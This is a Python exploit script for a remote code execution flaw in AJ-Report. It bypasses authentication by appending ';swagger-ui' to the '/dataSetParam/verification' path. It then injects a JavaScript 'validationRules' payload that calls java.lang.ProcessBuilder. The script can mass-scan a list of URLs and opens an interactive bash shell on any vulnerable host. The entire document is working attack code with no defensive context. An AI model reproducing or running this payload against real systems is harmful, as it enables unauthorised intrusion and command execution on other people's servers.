import requests
import urllib3
from urllib.parse import urljoin,quote
import argparse
import ssl
import json
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url, "/dataSetParam/verification;swagger-ui/")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Content-Type":"application/json;charset=UTF-8"
    }
    data = '{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\\\"echo\\\",\\\"HelloWorldTest\\\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}'
    try:
        response = requests.post(target, verify=False, headers=headers, data = data,timeout=15)
        if response.status_code == 200 and 'HelloWorldTest' in response.text and 'message' in response.text and 'data' in response.text:
                print(f"\033[31mDiscovered:{url}: AJ-Report_verificationswagger-ui_RCE!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    target = urljoin(url, "/dataSetParam/verification;swagger-ui/")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            json_data={
                "ParamName":"",
                "paramDesc": "",
                "paramType": "",
                "sampleItem": "1",
                "mandatory": 'true',
                "requiredFlag": 1,
                "validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"bash\",\"-c\",\"%s\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"%(command)
            }
            if "exit" not in command:
                try:
                    response_sult = requests.post(target, verify=False, headers=headers, json=json_data,timeout=15)
                    if response_sult.status_code == 200 and 'message' in response_sult.text and 'data' in response_sult.text:
                        data = json.loads(response_sult.text)['data']
                        print(data)
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")